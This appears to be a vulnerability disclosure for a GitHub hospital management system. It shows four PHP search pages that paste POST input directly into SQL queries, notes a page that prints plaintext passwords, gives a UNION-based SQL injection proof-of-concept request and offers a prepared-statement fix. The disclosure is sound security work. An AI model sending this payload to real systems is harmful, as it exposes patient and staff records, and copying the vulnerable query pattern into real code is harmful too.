# SQL Injection — Hospital Management System

**Repository:** https://github.com/kishan0725/Hospital-Management-System  
**GitHub Issue:** https://github.com/kishan0725/Hospital-Management-System/issues/72  
**Severity:** Critical (CVSS v3.1: 9.8)  
**CWE:** CWE-89  
**CVE:** Pending  
**Discovered:** 2026-06-19  
**Reporter:** abdurazzoqovjavohir700@gmail.com

## Vulnerable Files

### 1. `appsearch.php`
```php
$contact = $_POST['app_contact'];
$query = "select * from appointmenttb where contact= '$contact';";
```

### 2. `doctorsearch.php`
```php
$name = $_POST['doc_name'];
$query = "select * from doctortb where name='$name'";
// Plaintext password displayed: echo "<td>$password</td>"
```

### 3. `patientsearch.php` 
```php
$contact = $_POST['pat_contact'];
$query = "select * from patienttb where contact='$contact'";
```

### 4. `messearch.php`
```php
$contact = $_POST['mes_contact'];
$query = "select * from contact where contact= '$contact'";
```

## Proof of Concept

```http
POST /appsearch.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

app_contact=' UNION SELECT 1,2,3,4,5,6,7,8-- -
```

## Fix
```php
$stmt = $conn->prepare("SELECT * FROM appointmenttb WHERE contact = ?");
$stmt->bind_param("s", $_POST['app_contact']);
$stmt->execute();
```
